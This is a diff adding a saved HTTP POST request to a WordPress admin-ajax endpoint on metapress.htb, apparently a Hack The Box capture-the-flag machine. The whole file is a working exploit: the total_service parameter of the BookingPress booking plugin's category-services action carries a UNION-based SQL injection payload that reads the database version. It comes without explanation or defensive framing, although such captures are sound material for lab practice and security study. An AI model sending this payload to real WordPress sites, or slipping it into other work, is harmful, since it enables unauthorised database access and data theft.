@@ -1,0 +1,14 @@
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: metapress.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 149
+Origin: http://metapress.htb
+Connection: close
+Referer: http://metapress.htb/events/
+Cookie: wp-settings-2=mfold%3Do; wp-settings-time-2=1680120318; PHPSESSID=otnh2ab9u4lvlf9kh1ifric1li
+
+action=bookingpress_front_get_category_services&_wpnonce=4f9fabf4c0&category_id=1&total_service=-7502) UNION ALL SELECT @@version,1,2,3,4,5,6,7,8-- -
